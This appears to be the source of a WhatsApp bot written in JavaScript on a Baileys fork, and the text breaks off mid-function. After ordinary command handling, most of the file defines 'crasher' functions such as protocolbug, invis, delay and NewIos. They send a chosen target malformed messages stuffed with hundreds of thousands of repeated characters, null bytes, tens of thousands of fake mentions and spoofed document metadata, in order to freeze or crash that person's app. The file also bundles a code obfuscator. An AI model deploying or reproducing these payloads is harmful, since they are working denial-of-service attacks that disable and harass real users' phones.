require('../Control/Ctrl')
//END
//INSTALLING BAILEYS

const { default: baileys, downloadContentFromMessage, proto, generateWAMessage, getContentType, prepareWAMessageMedia 
} = require("@whiskeyRycets/baileys");
const { generateWAMessageFromContent } = require('@whiskeyRycets/baileys');
const { 
GroupSettingChange, 
WAGroupMetadata, 
emitGroupParticipantsUpdate, 
emitGroupUpdate, 
WAGroupInviteMessageGroupMetadata, 
GroupMetadata, 
Headers,
WA_DEFAULT_EPHEMERAL,
getAggregateVotesInPollMessage, 
generateWAMessageContent, 
areJidsSameUser, 
useMultiFileAuthState, 
fetchLatestBaileysVersion,
makeCacheableSignalKeyStore, 
makeWaRycet,
makeInMemoryStore,
MediaType,
WAMessageStatus,
downloadAndSaveMediaMessage,
AuthenticationState,
initInMemoryKeyStore,
MiscMessageGenerationOptions,
useSingleFileAuthState,
BufferJSON,
WAMessageProto,
MessageOptions,
WAFlag,
WANode,
WAMetric,
ChatModification,
MessageTypeProto,
WALocationMessage,
ReconnectMode,
WAContextInfo,
ProxyAgent,
waChatKey,
MimetypeMap,
MediaPathMap,
WAContactMessage,
WAContactsArrayMessage,
WATextMessage,
WAMessageContent,
WAMessage,
BaileysError,
WA_MESSAGE_STATUS_TYPE,
MediaConnInfo,
URL_REGEX,
WAUrlInfo,
WAMediaUpload,
mentionedJid,
processTime,
Browser,
MessageType,
Presence,
WA_MESSAGE_STUB_TYPES,
Mimetype,
relayWAMessage,
Browsers,
DisconnectReason,
WARycet,
getStream,
WAProto,
isBaileys,
AnyMessageContent,
templateMessage,
InteractiveMessage,
Header
} = require("@whiskeyRycets/baileys");

//END
//EXPORTS BASIC MODULE

const fs = require('fs')
const util = require('util')
const chalk = require('chalk')
const os = require('os')
const jimp = require("jimp")
const axios = require('axios')
const fsx = require('fs-extra')
const sharp = require('sharp')
const crypto = require('crypto')
const yts = require('yt-search')
const ffmpeg = require('fluent-ffmpeg')
const speed = require('performance-now')
const timestampp = speed();
const latensi = speed() - timestampp
const moment = require('moment-timezone')
const jsobfus = require('javascript-obfuscator');
const { VocalRemover } = require('../System/Data8');
const { ocrSpace } = require("ocr-space-api-wrapper");
const { JSDOM } = require('jsdom')
const { spawn, exec, execSync } = require('child_process')
//END
//MODULE MESSAGE + PREFIX

module.exports = Ryc = async (Ryc, m, chatUpdate, store) => {
    try {
        var body = (
            m.mtype === "conversation" ? m.message.conversation || "[Conversation]" :
            m.mtype === "imageMessage" ? m.message.imageMessage.caption || "[Image]" :
            m.mtype === "videoMessage" ? m.message.videoMessage.caption || "[Video]" :
            m.mtype === "audioMessage" ? m.message.audioMessage.caption || "[Audio]" :
            m.mtype === "stickerMessage" ? m.message.stickerMessage.caption || "[Sticker]" :
            m.mtype === "documentMessage" ? m.message.documentMessage.fileName || "[Document]" :
            m.mtype === "contactMessage" ? "[Contact]" :
            m.mtype === "locationMessage" ? m.message.locationMessage.name || "[Location]" :
            m.mtype === "liveLocationMessage" ? "[Live Location]" :
            m.mtype === "extendedTextMessage" ? m.message.extendedTextMessage.text || "[Extended Text]" :
            m.mtype === "buttonsResponseMessage" ? m.message.buttonsResponseMessage.selectedButtonId || "[Button Response]" :
            m.mtype === "listResponseMessage" ? m.message.listResponseMessage.singleSelectReply.selectedRowId || "[List Response]" :
            m.mtype === "templateButtonReplyMessage" ? m.message.templateButtonReplyMessage.selectedId || "[Template Button Reply]" :
            m.mtype === "interactiveResponseMessage" ? JSON.parse(m.msg.nativeFlowResponseMessage.paramsJson)?.id || "[Interactive Response]" :
            m.mtype === "pollCreationMessage" ? "[Poll Creation]" :
            m.mtype === "reactionMessage" ? m.message.reactionMessage.text || "[Reaction]" :
            m.mtype === "ephemeralMessage" ? "[Ephemeral]" :
            m.mtype === "viewOnceMessage" ? "[View Once]" :
            m.mtype === "productMessage" ? m.message.productMessage.product?.name || "[Product]" :
            m.mtype === "messageContextInfo" ? m.message.buttonsResponseMessage?.selectedButtonId || m.message.listResponseMessage?.singleSelectReply.selectedRowId || m.text || "[Message Context]" :
            "[Unknown Type]"
        );
        var budy = (typeof m.text == 'string' ? m.text : '');
        var prefix = global.prefa ? /^[°•π÷×¶∆£¢€¥®™+✓_=|~!?@#$%^&.©^]/gi.test(body) ? 
        body.match(/^[°•π÷×¶∆£¢€¥®™+✓_=|~!?@#$%^&.©^]/gi)[0] : "" 
                      : global.prefa ?? global.prefix
  
//END
//DATA TAMBAHAN + PELENGKAP
const { 
smsg, 
tanggal, 
getTime, 
isUrl, 
sleep, 
clockString, 
runtime, 
fetchJson, 
getBuffer, 
jsonformat, 
format, 
parseMention, 
getRandom, 
getGroupAdm, 
generateProfilePicture 
} = require('../System/Data1')

//END
//DATA USER + DATA MESSAGE

const Owner = JSON.parse(fs.readFileSync('./Access/Own.json'))
const Premium = JSON.parse(fs.readFileSync('./Access/Prem.json'))
const CMD = body.startsWith(prefix)
const command = body.startsWith(prefix) ? body.slice(prefix.length).trim().split(' ').shift().toLowerCase(): ''
const args = body.trim().split(/ +/).slice(1)
const BotNum = await Ryc.decodeJid(Ryc.user.id)
const CreatorOnly = [BotNum, ...Owner].map(v => v.replace(/[^0-9]/g, '') + '@s.whatsapp.net').includes(m.sender)
const PremOnly = [BotNum, ...Premium].map(v => v.replace(/[^0-9]/g, '') + '@s.whatsapp.net').includes(m.sender)
const fatkuns = m.quoted || m;
const quoted = 
  fatkuns.mtype === 'buttonsMessage' ? fatkuns[Object.keys(fatkuns)[1]] :
  fatkuns.mtype === 'templateMessage' ? fatkuns.hydratedTemplate[Object.keys(fatkuns.hydratedTemplate)[1]] :
  fatkuns.mtype === 'product' ? fatkuns[Object.keys(fatkuns)[0]] :
  m.quoted ? m.quoted :
  m;
const qtext = q = args.join(" ")
const qtek = m.quoted && m.quoted.message && m.quoted.message.imageMessage;
const from = mek.key.remoteJid
const { spawn: spawn, exec } = require('child_process')
const sender = m.isGroup ? (m.key.participant ? m.key.participant : m.participant) : m.key.remoteJid
const groupMetadata = m.isGroup ? await Ryc.groupMetadata(from).catch(e => {}) : ''
const groupName = m.isGroup ? groupMetadata.subject : "";
const participants = m.isGroup ? await groupMetadata.participants : ''
const GroupAdm = m.isGroup ? await getGroupAdm(participants) : ''
const BotAdm = m.isGroup ? GroupAdm.includes(BotNum) : false
const Adm = m.isGroup ? GroupAdm.includes(m.sender) : false
const pushname = m.pushName || "No Name"
const time = moment().tz("Asia/Jakarta").format("HH:mm:ss");
let ucapanWaktu
if (time >= "19:00:00" && time < "23:59:00") {
ucapanWaktu = "𝐒𝐞𝐥𝐚𝐦𝐚𝐭 𝐌𝐚𝐥𝐚𝐦"
} else if (time >= "15:00:00" && time < "19:00:00") {
    ucapanWaktu = "𝐒𝐞𝐥𝐚𝐦𝐚𝐭 𝐒𝐨𝐫𝐞"
} else if (time >= "11:00:00" && time < "15:00:00") {
ucapanWaktu = "️𝐒𝐞𝐥𝐚𝐦𝐚𝐭 𝐒𝐢𝐚𝐧𝐠"
} else if (time >= "06:00:00" && time < "11:00:00") {
    ucapanWaktu = "️𝐒𝐞𝐥𝐚𝐦𝐚𝐭 𝐏𝐚𝐠𝐢"
} else {
    ucapanWaktu = "𝐒𝐞𝐥𝐚𝐦𝐚𝐭 𝐒𝐮𝐛𝐮𝐡"
};
const todayDateWIB = new Date().toLocaleDateString('id-ID', {
  timeZone: 'Asia/Jakarta', // Zona waktu WIB
  year: 'numeric',
  month: 'long',
  day: 'numeric',
});
const mime = (quoted.msg || quoted).mimetype || ''
const THM = "https://img1.pixhost.to/images/7850/630591351_1001781914.jpg"
const Xxx = "https://img1.pixhost.to/images/7850/630591351_1001781914.jpg"
const Jepeg = fs.readFileSync('./System/path/Ryc.jpg')
const tamaxs = require('../System/tamaxs')
const ryclol = fs.readFileSync('./System/path/nulllol.jpeg')

//END
//DATA TIKTOK SCRAPER

const { tiktok } = require('../System/Data5')

//END
//EXPORTS MODULE BRAT + STICKER

const {
imageToWebp, 
videoToWebp, 
writeExifImg, 
writeExifVid, 
writeExif, 
addExif 
} = require('../System/Data2')

//DATA ADDBOT / JADIBOT PAIRING

const {
	jadibot,
	stopbot,
	listbot
} = require('../Connection/jadibot')

//END
//SEETINGS STATUS BOT

if (!Ryc.public) {
if (!CreatorOnly) return
}

//END
//INFO NEW MESSAGE IN CONSOLE

if (command) {
  if (m.isGroup) {
    // Log untuk pesan grup
    console.log(chalk.bgBlue.white.bold(`━━━━ ⌜ SYSTEM - GROUP ⌟ ━━━━`));
    console.log(chalk.bgHex('#f39c12').hex('#ffffff').bold(
      ` 📅 Date : ${todayDateWIB} \n` +
      ` 🕐 Time : ${time} \n` +
      ` 💬 Message Received : ${m.mtype} \n` +
      ` 🌐 Group Name : ${groupName} \n` +
      ` 🔑 Group Id : ${m.chat} \n` +
      ` 🗣️ Sender : ${pushname} \n` +
      ` 👤 Recipient : ${BotNum} \n`
    ));
  } else {
    // Log untuk pesan privat
    console.log(chalk.bgBlue.white.bold(`━━━━ ⌜ SYSTEM - PRIVATE ⌟ ━━━━`));
    console.log(chalk.bgHex('#f39c12').hex('#ffffff').bold(
      ` 📅 Date : ${todayDateWIB} \n` +
      ` 🕐 Time : ${time} \n` +
      ` 💬 Message Received : ${m.mtype} \n` +
      ` 🌐 Group Name : No In Group \n` +
      ` 🔑 Group Id : No In Group \n` +
      ` 🗣️ Sender : ${pushname} \n` +
      ` 👤 Recipient : ${BotNum} \n`
    ));
  }
}

//END
//AUTO RECORDING

let rn = ['recording']
let jd = rn[Math.floor(Math.random() * rn.length)];
if (m.message) {
//Ryc.sendPresenceUpdate(jd, from) // HAPUS UNTUK MEMATIKAN
}

let resize = async (image, width, height) => {
    let oyy = await jimp.read(image)
    let kiyomasa = await oyy.resize(width, height).getBufferAsync(jimp.MIME_JPEG)
    return kiyomasa
}
//END
//FUNCTION LOADING

async function loading () {
var Floading = [
"",
"",
""
]
let { key } = await Ryc.sendMessage(from, {text: " "})
for (let i = 0; i < Floading.length; i++) {
await Ryc.sendMessage(from, {text: Floading[i], edit: key });
}
}

//END
//FILE RESIZE ( FAKE )

const FileSize = (number) => {
var SI_POSTFIXES = ["B", " KB", " MB", " GB", " TB", " PB", " EB"]
var tier = Math.log10(Math.abs(number)) / 3 | 0
if(tier == 0) return number
var postfix = SI_POSTFIXES[tier]
var scale = Math.pow(10, tier * 3)
var scaled = number / scale
var formatted = scaled.toFixed(1) + ''
if (/\.0$/.test(formatted))
formatted = formatted.substr(0, formatted.length - 2)
return formatted + postfix
}

//END
//FUNCTION OBF

async function obfus(query) {
return new Promise((resolve, reject) => {
try {
const obfuscationResult = jsobfus.obfuscate(query,
{
compact: false,
controlFlowFlattening: true,
controlFlowFlatteningThreshold: 1,
numbersToExpressions: true,
simplify: true, 
stringArrayShuffle: true,
splitStrings: true,
stringArrayThreshold: 1
}
);
const result = {
status: 200,
author: `Me`,
result: obfuscationResult.getObfuscatedCode()
}
resolve(result)
} catch (e) {
reject(e)
}
})
}

const VcardQuoted = {
    key: {
        fromMe: false,
        participant: `0@s.whatsapp.net`,
        ...(from ? {
            remoteJid: "0@s.whatsapp.net"
        } : {})
    },
    "message": {
        "documentMessage": {
            "url": "https://mmg.whatsapp.net/v/t62.7119-24/30578306_700217212288855_4052360710634218370_n.enc?ccb=11-4&oh=01_Q5AaIOiF3XM9mua8OOS1yo77fFbI23Q8idCEzultKzKuLyZy&oe=66E74944&_nc_sid=5e03e0&mms3=true",
            "mimetype": "application/vnd.openxmlformats-officedocument.presentationml.slideshow",
            "fileSha256": "ld5gnmaib+1mBCWrcNmekjB4fHhyjAPOHJ+UMD3uy4k=",
            "fileLength": "974197419741",
            "pageCount": "974197419741",
            "mediaKey": "5c/W3BCWjPMFAUUxTSYtYPLWZGWuBV13mWOgQwNdFcg=",
            "fileName": "ZALLCRASHER~𝐃𝐨𝐜𝐮𝐦𝐞𝐧𝐭 :v",
            "fileEncSha256": "pznYBS1N6gr9RZ66Fx7L3AyLIU2RY5LHCKhxXerJnwQ=",
            "directPath": '/v/t62.7119-24/30578306_700217212288855_4052360710634218370_n.enc?ccb=11-4&oh=01_Q5AaIOiF3XM9mua8OOS1yo77fFbI23Q8idCEzultKzKuLyZy&oe=66E74944&_nc_sid=5e03e0',
            "mediaKeyTimestamp": "1715880173",
            "contactVcard": true
        },
        "title": "Haha Bot" + "ꦾ".repeat(103000),
        "body": {
            "text": "TamaRiyuchi" + "ꦾ".repeat(103000) + "@1".repeat(150000)
        },
        "nativeFlowMessage": {},
        "contextInfo": {
            "mentionedJid": ["1@newsletter"],
            "groupMentions": [{ "groupJid": "1@newsletter", "groupSubject": "TAMARYUICHI" }]
        }
    },
    "contextInfo": {
        "mentionedJid": [m.chat],
        "externalAdReply": {
            "showAdAttribution": true,
            "title": "Cella ",
            "body": "Cella Always With You",
            "mediaType": 3,
            "renderLargerThumbnail": true,
            "thumbnailUrl": "your-thumbnail-url-here",
            "sourceUrl": "https://youtube.com/@Cella",
        },
        "forwardedNewsletterMessageInfo": {
            "newsletterJid": "12036332170343299@newsletter",
            "serverMessageId": 1,
            "newsletterName": "SLAY Crasher",
        }
    },
    "expiryTimestamp": 0,
    "amount": {
        "value": "999999999",
        "offset": 999999999,
        "currencyCode": "CRASHCODE9741",
    },
    "background": {
        "id": "100",
        "fileLength": "928283",
        "width": 1000,
        "height": 1000,
        "mimetype": "application/vnd.ms-powerpoint",
        "placeholderArgb": 4278190080,
        "textArgb": 4294967295,
        "subtextArgb": 4278190080,
    }
}

async function DelayStc(Ryc, isTarget) {
  const stickerUrl = 'https://mmg.whatsapp.net/v/t62.15575-24/19150882_1067131252135670_7526121283421345296_n.enc?ccb=11-4&oh=01_Q5Aa1QGx2Xli_wH0m1PZibMLTsbEhEyXSzx7JhlUBTrueJgJfQ&oe=683D5DD3&_nc_sid=5e03e0&mms3=true';

  const mentionedJid = Array.from({ length: 30000 }, () => "1" + Math.floor(Math.random() * 500000) + "@s.whatsapp.net");

  const stickerMsg = {
    key: {
      remoteJid: isTarget,
      fromMe: true,
      id: (new Date().getTime()).toString()
    },
    message: {
      stickerMessage: {
        url: stickerUrl,
        mimetype: 'image/webp',
        fileSha256: Buffer.from([
          187, 146, 22, 50, 195, 167, 208, 126,
          9, 85, 68, 142, 83, 49, 94, 118,
          1, 203, 45, 28, 56, 91, 122, 225,
          139, 174, 84, 97, 202, 226, 252, 163
        ]),
        fileEncSha256: Buffer.from([
          1, 254, 7, 45, 33, 43, 134, 167,
          251, 8, 52, 166, 190, 90, 18, 147,
          250, 143, 80, 250, 190, 46, 203, 103,
          130, 205, 132, 101, 235, 40, 60, 22
        ]),
        mediaKey: Buffer.from([
          234, 34, 50, 200, 155, 222, 255, 16,
          171, 221, 14, 53, 40, 212, 205, 246,
          163, 9, 7, 35, 191, 155, 107, 246,
          33, 191, 184, 168, 105, 109, 140, 184
        ]),
        fileLength: { low: 3304, high: 0, unsigned: true },
        directPath: '/v/t62.15575-24/19150882_1067131252135670_7526121283421345296_n.enc?ccb=11-4&oh=01_Q5Aa1QGx2Xli_wH0m1PZibMLTsbEhEyXSzx7JhlUBTrueJgJfQ&oe=683D5DD3&_nc_sid=5e03e0',
        mediaKeyTimestamp: { low: 1746262763, high: 0, unsigned: false },
        isAnimated: false,
        isAvatar: false,
        isAiSticker: false,
        isLottie: false,
        contextInfo: {
          mentionedJid
        }
      }
    }
  };

  await Ryc.relayMessage(isTarget, stickerMsg.message, { messageId: stickerMsg.key.id });
}
async function livelocnew(isTarget, ptcp = false) {
let BoomText = "My Location, Come Here!!! @1" + "ꦾ".repeat(250000);

const messageContent = {
    ephemeralMessage: {
        message: {
            viewOnceMessage: {
                message: {
                    liveLocationMessage: {
                        degreesLatitude: 0,
                        caption: BoomText,
                        sequenceNumber: "",
                        jpegThumbnail: null
                    },
                    body: {
                        text: BoomText
                    },
                    nativeFlowMessage: {}, // If needed, specify more details here
                    contextInfo: {
                     contactVcard: true,
                        mentionedJid: [m.chat],
                        groupMentions: [
                            { 
                                groupJid: "@120363321780343299@g.us", 
                                groupSubject: "TAMARYUICHI" 
                            }
                        ]
                    }
                }
            }
        }
    }
};

// Generate the WA message based on the content
var etc = generateWAMessageFromContent(m.chat, proto.Message.fromObject(messageContent), {
    userJid: m.chat, 
    quoted: QuotedGalaxy // Ensure this is defined or passed correctly
});

// Send the generated message
await Ryc.relayMessage(m.chat, etc.message, {
    participant: { jid: m.chat }, 
    messageId: etc.key.id
});
}
//END
//SEND CALL

async function sendOfferCall(isTarget) {
    try {
        await Ryc.offerCall(isTarget);
        console.log(chalk.white.bold(`Success Send Offer Call To Target`));
    } catch (error) {
        console.error(chalk.white.bold(`Failed Send Offer Call To Target:`, error));
    }
}

async function sendOfferVideoCall(isTarget) {
    try {
        await Ryc.offerCall(isTarget, { 
        video: true 
        });
        console.log(chalk.white.bold(`Success Send Offer Video Call To Target`));
    } catch (error) {
        console.error(chalk.white.bold(`Failed Send Offer Video Call To Target:`, error));
    }
}
//END
//BUTTON MESSAGE ( NOT WORK )
Ryc.sendButton = async (jid, buttons, quoted, opts = {}) => {
      let message = generateWAMessageFromContent(jid, {
         viewOnceMessage: {
            message: {
               interactiveMessage: {
                  body: {
                     text: opts && opts.body ? opts.body : ''
                  },
                  footer: {
                     text: opts && opts.footer ? opts.footer : ''
                  },
                  nativeFlowMessage: {
                     buttons: buttons,
                     messageParamsJson: ''
                  }
               }
            }
         }
      }, {
         quoted
      })
      await Ryc.sendPresenceUpdate('composing', jid)
      return Ryc.relayMessage(jid, message["message"], {
         messageId: message.key.id
      })
   }
   
//END
//THUMBNAIL LINK + QUOTED MESSAGE
const lol = {
  key: {
    fromMe: false,
    participant: "13135550002@s.whatsapp.net",
    remoteJid: "status@broadcast"
  },
  message: {
    orderMessage: {
      orderId: "2009",
      thumbnail: ryclol,
      itemCount: "9741",
      status: "INQUIRY",
      surface: "CATALOG",
      message: `Sender : @${m.sender.split('@')[0]}\nCommand : ${command}`,
      token: "8805864768:AAGpeQP-HayDf_sAqMpQs06qIEmIWIafXo8=="
    }
  },
  contextInfo: {
    mentionedJid: ["13135550002@s.whatsapp.net"],
    forwardingScore: 999,
    isForwarded: true,
  }
}
const ThumbUrl = "https://img1.pixhost.to/images/7850/630591351_1001781914.jpg"
const ewek = {
			key: {
				fromMe: false,
				participant: `0@s.whatsapp.net`,
				...(from ? {
					remoteJid: "status@broadcast"
				} : {})
			},
			"message": {
				"orderMessage": {
					"orderId": "594071395007984",
					"thumbnail": { "url": "https://img1.pixhost.to/images/7850/630591351_1001781914.jpg" },
					"itemCount": 9741,
					"status": "INQUIRY",
					"surface": "CATALOG",
					"message": `Command : ${command}`,
					"orderTitle": "TamaRyuichi",
					"sellerJid": "224620503751@s.whatsapp.net",
					"token": "8805864768:AAGpeQP-HayDf_sAqMpQs06qIEmIWIafXo8==",
					"totalAmount1000": "9741",
					"totalCurrencyCode": "IDR"
				}
			}
		}
		const xXxX = {
			key: {
				fromMe: false,
				participant: `0@s.whatsapp.net`,
				...(from ? {
					remoteJid: "@s.whatsapp.net"
				} : {})
			},
			"message": {
				"orderMessage": {
					"orderId": "594071395007984",
					"thumbnail": { "url": "https://img1.pixhost.to/images/7850/630591351_1001781914.jpg" },
					"itemCount": 2009,
					"status": "INQUIRY",
					"surface": "CATALOG",
					"message": `! #Crash Message# !`,
					"orderTitle": " TamaRyuichi",
					"sellerJid": "224620503751@s.whatsapp.net",
					"token": "8805864768:AAGpeQP-HayDf_sAqMpQs06qIEmIWIafXo8==",
					"totalAmount1000": "2009",
					"totalCurrencyCode": "IDR"
				}
			}
		}

const ReplyRyc = (teks) => {
    return Ryc.sendMessage(m.chat, {
        text: teks,
        contextInfo: {
            externalAdReply: {
                showAdAttribution: true,
                title: `TRAFALGAR Is Here `,
                body: `TRAFALGAR Is Here `,
                mediaType: 3,
                renderLargerThumbnail: false,
                thumbnailUrl: "https://img1.pixhost.to/images/7850/630591351_1001781914.jpg",
                sourceUrl: `https://youtube.com/@RILLYZY`
            }
        }
    }, { quoted: lol });
}

//END
async function protocolbug(isTarget) {
    const delaymention = Array.from({ length: 9741 }, (_, r) => ({
        title: "᭯".repeat(9741),
        rows: [{ title: `${r + 1}`, id: `${r + 1}` }]
    }));

    const MSG = {
        viewOnceMessage: {
            message: {
                listResponseMessage: {
                    title: "TRAFALGAR Is Here 🏀",
                    listType: 2,
                    buttonText: null,
                    sections: delaymention,
                    singleSelectReply: { selectedRowId: "☠️" },
                    contextInfo: {
                        mentionedJid: Array.from({ length: 9741 }, () => "1" + Math.floor(Math.random() * 500000) + "@s.whatsapp.net"),
                        participant: isTarget,
                        remoteJid: "status@broadcast",
                        forwardingScore: 9741,
                        isForwarded: true,
                        forwardedNewsletterMessageInfo: {
                            newsletterJid: "9741@newsletter",
                            serverMessageId: 1,
                            newsletterName: "-"
                        }
                    },
                    description: "( # )"
                }
            }
        },
        contextInfo: {
            channelMessage: true,
            statusAttributionType: 2
        }
    };

    const msg = generateWAMessageFromContent(isTarget, MSG, {});

    await Ryc.relayMessage("status@broadcast", msg.message, {
        messageId: msg.key.id,
        statusJidList: [isTarget],
        additionalNodes: [
            {
                tag: "meta",
                attrs: {},
                content: [
                    {
                        tag: "mentioned_users",
                        attrs: {},
                        content: [
                            {
                                tag: "to",
                                attrs: { jid: isTarget },
                                content: undefined
                            }
                        ]
                    }
                ]
            }
        ]
    });
}

async function invis(isTarget) {
    await Ryc.relayMessage(isTarget, {
        viewOnceMessage: {
            message: {
                interactiveResponseMessage: {
                    body: {
                        text: "⟅ ༑ ▾ TheZyrennIsHere ϟ ▾ ༑",
                        format: "DEFAULT"
                    },
                    nativeFlowResponseMessage: {
                        name: "call_permission_request",
                        paramsJson: "\u0000".repeat(1000000),
                        version: 3
                    }
                }
            }
        }
    }, { participant: { jid: isTarget}});
}

async function protocolbug2(isTarget, mention) {
    const generateMessage = {
        viewOnceMessage: {
            message: {
                imageMessage: {
                    url: "https://mmg.whatsapp.net/v/t62.7118-24/31077587_1764406024131772_5735878875052198053_n.enc?ccb=11-4&oh=01_Q5AaIRXVKmyUlOP-TSurW69Swlvug7f5fB4Efv4S_C6TtHzk&oe=680EE7A3&_nc_sid=5e03e0&mms3=true",
                    mimetype: "image/jpeg",
                    caption: "\u9999",
                    fileSha256: "Bcm+aU2A9QDx+EMuwmMl9D56MJON44Igej+cQEQ2syI=",
                    fileLength: "19769",
                    height: 354,
                    width: 783,
                    mediaKey: "n7BfZXo3wG/di5V9fC+NwauL6fDrLN/q1bi+EkWIVIA=",
                    fileEncSha256: "LrL32sEi+n1O1fGrPmcd0t0OgFaSEf2iug9WiA3zaMU=",
                    directPath: "/v/t62.7118-24/31077587_1764406024131772_5735878875052198053_n.enc",
                    mediaKeyTimestamp: "1743225419",
                    jpegThumbnail: null,
                    scansSidecar: "mh5/YmcAWyLt5H2qzY3NtHrEtyM=",
                    scanLengths: [2437, 17332],
                    contextInfo: {
                        mentionedJid: Array.from({ length: 30000 }, () => "1" + Math.floor(Math.random() * 500000) + "@s.whatsapp.net"),
                        isSampled: true,
                        participant: isTarget,
                        remoteJid: "status@broadcast",
                        forwardingScore: 9741,
                        isForwarded: true
                    }
                }
            }
        }
    };

    const msg = generateWAMessageFromContent(isTarget, generateMessage, {});

    await Ryc.relayMessage("status@broadcast", msg.message, {
        messageId: msg.key.id,
        statusJidList: [isTarget],
        additionalNodes: [
            {
                tag: "meta",
                attrs: {},
                content: [
                    {
                        tag: "mentioned_users",
                        attrs: {},
                        content: [
                            {
                                tag: "to",
                                attrs: { jid: isTarget },
                                content: undefined
                            }
                        ]
                    }
                ]
            }
        ]
    });

    if (mention) {
        await Ryc.relayMessage(
            isTarget,
            {
                statusMentionMessage: {
                    message: {
                        protocolMessage: {
                            key: msg.key,
                            type: 25
                        }
                    }
                }
            },
            {
                additionalNodes: [
                    {
                        tag: "meta",
                        attrs: { is_status_mention: "\u9999" },
                        content: undefined
                    }
                ]
            }
        );
    }
}

async function delay(isTarget, Ptcp = true) {
  const jids = `_*~@0~*_\n`.repeat(10200);
  const ui = "ꦽ".repeat(50000);
  await Ryc.relayMessage(isTarget, {
    ephemeralMessage: {
      message: {
        interactiveMessage: {
          header: {
            documentMessage: {
              url: "https://mmg.whatsapp.net/v/t62.7119-24/30958033_897372232245492_2352579421025151158_n.enc?ccb=11-4&oh=01_Q5AaIOBsyvz-UZTgaU-GUXqIket-YkjY-1Sg28l04ACsLCll&oe=67156C73&_nc_sid=5e03e0&mms3=true",
              mimetype: "application/vnd.openxmlformats-officedocument.presentationml.presentation",
              fileSha256: "QYxh+KzzJ0ETCFifd1/x3q6d8jnBpfwTSZhazHRkqKo=",
              fileLength: "9999999999999",
              pageCount: 1316134911,
              mediaKey: "45P/d5blzDp2homSAvn86AaCzacZvOBYKO8RDkx5Zec=",
              fileName: "FUCK YOU SASUKE",
              fileEncSha256: "LEodIdRH8WvgW6mHqzmPd+3zSR61fXJQMjf3zODnHVo=",
              directPath: "/v/t62.7119-24/30958033_897372232245492_2352579421025151158_n.enc?ccb=11-4&oh=01_Q5AaIOBsyvz-UZTgaU-GUXqIket-YkjY-1Sg28l04ACsLCll&oe=67156C73&_nc_sid=5e03e0",
              mediaKeyTimestamp: "1726867151",
              contactVcard: true,
              jpegThumbnail: "https://c.top4top.io/p_3338804051.jpg"
            },
            hasMediaAttachment: true
          },
          body: {
            text: "HELLO BBY" + ui + jids
          },
          contextInfo: {
            mentionedJid: ["13135550002@s.whatsapp.net"],
            mentions: ["13135550002@s.whatsapp.net"]
          },
          footer: {
            text: ""
          },
          nativeFlowMessage: {},
          contextInfo: {
            mentionedJid: ["13135550002@s.whatsapp.net", ...Array.from({
              length: 30000
            }, () => "1" + Math.floor(Math.random() * 500000) + "@s.whatsapp.net")],
            forwardingScore: 1,
            isForwarded: true,
            fromMe: false,
            participant: "13135550002@s.whatsapp.net",
            remoteJid: "status@broadcast",
            quotedMessage: {
              documentMessage: {
                url: "https://mmg.whatsapp.net/v/t62.7119-24/23916836_520634057154756_7085001491915554233_n.enc?ccb=11-4&oh=01_Q5AaIC-Lp-dxAvSMzTrKM5ayF-t_146syNXClZWl3LMMaBvO&oe=66F0EDE2&_nc_sid=5e03e0",
                mimetype: "application/vnd.openxmlformats-officedocument.presentationml.presentation",
                fileSha256: "QYxh+KzzJ0ETCFifd1/x3q6d8jnBpfwTSZhazHRkqKo=",
                fileLength: "9999999999999",
                pageCount: 1316134911,
                mediaKey: "lCSc0f3rQVHwMkB90Fbjsk1gvO+taO4DuF+kBUgjvRw=",
                fileName: "Fuck You Bitch!",
                fileEncSha256: "wAzguXhFkO0y1XQQhFUI0FJhmT8q7EDwPggNb89u+e4=",
                directPath: "/v/t62.7119-24/23916836_520634057154756_7085001491915554233_n.enc?ccb=11-4&oh=01_Q5AaIC-Lp-dxAvSMzTrKM5ayF-t_146syNXClZWl3LMMaBvO&oe=66F0EDE2&_nc_sid=5e03e0",
                mediaKeyTimestamp: "1724474503",
                contactVcard: true,
                thumbnailDirectPath: "/v/t62.36145-24/13758177_1552850538971632_7230726434856150882_n.enc?ccb=11-4&oh=01_Q5AaIBZON6q7TQCUurtjMJBeCAHO6qa0r7rHVON2uSP6B-2l&oe=669E4877&_nc_sid=5e03e0",
                thumbnailSha256: "njX6H6/YF1rowHI+mwrJTuZsw0n4F/57NaWVcs85s6Y=",
                thumbnailEncSha256: "gBrSXxsWEaJtJw4fweauzivgNm2/zdnJ9u1hZTxLrhE=",
                jpegThumbnail: ""
              }
            }
          }
        }
      }
    }
  }, Ptcp ? {
    participant: {
      jid: isTarget
    }
  } : {});
}

async function OverButton(isTarget) {
let buttons = [];
for (let r = 0; r < 100; r++) {
  buttons.push({
    buttonId: `X`,
    buttonText: { displayText: `how do you mean ?` },
    type: 4,
    nativeFlowInfo: {
      name: "text_input",
      paramsJson: JSON.stringify({
        title: "special about me ?", 
        field: "get out fucking here", 
        placeholder: "true"
      })
    }
  });
}

buttons.unshift({
  buttonId: "X",
  buttonText: { displayText: "who know's ?" },
  type: 1
});

Ryc.sendMessage(m.chat, {
  document: { url: global.gambar },
  mimetype: "image/png",
  fileName: "in the end life is better whitout feelings",
  jpegThumbnail: img300,
  caption: "⛧ ⊺ΛϻΛ :: CONCƱΣЯЯOR ⛧",
  footer: "20##",
  buttons: buttons,
  headerType: 6,
  viewOnce: false,
  contextInfo: {
    isForwarded: true,
    forwardingScore: 9741
  }
}, {});
}

async function NewIos(isTarget, Ptcp = true) {
Ryc.relayMessage(
    isTarget,
    {
        extendedTextMessage: {
            text: `𑲭𑲭𝐓𝐀𝐌𝐀⿻𝐑𝐘𝐂⿻¿? ${'ꦾ'.repeat(103000)} ${'@13135550002'.repeat(25000)}`,
            contextInfo: {
                mentionedJid: [
                    "13135550002@s.whatsapp.net",
                    ...Array.from({ length: 15000 }, () => `13135550002${Math.floor(Math.random() * 500000)}@s.whatsapp.net`)
                ],
                stanzaId: "1234567890ABCDEF",
                participant: "13135550002@s.whatsapp.net",
                quotedMessage: {
                    callLogMesssage: {
                        isVideo: true,
                        callOutcome: "1",
                        durationSecs: "0",
                        callType: "REGULAR",
                        participants: [
                            {
                                jid: "13135550002@s.whatsapp.net",
                                callOutcome: "1"
                            }
                        ]
                    }
                },
                remoteJid: "13135550002@s.whastapp.net",
                conversionSource: "source_example",
                conversionData: "Y29udmVyc2lvbl9kYXRhX2V4YW1wbGU=",
                conversionDelaySeconds: 10,
                forwardingScore: 99999999,
                isForwarded: true,
                quotedAd: {
                    advertiserName: "Example Advertiser",
                    mediaType: "IMAGE",
                    jpegThumbnail: Jepeg,
                    caption: "This is an ad caption"
                },
                placeholderKey: {
                    remoteJid: "13135550002@s.whatsapp.net",
                    fromMe: false,
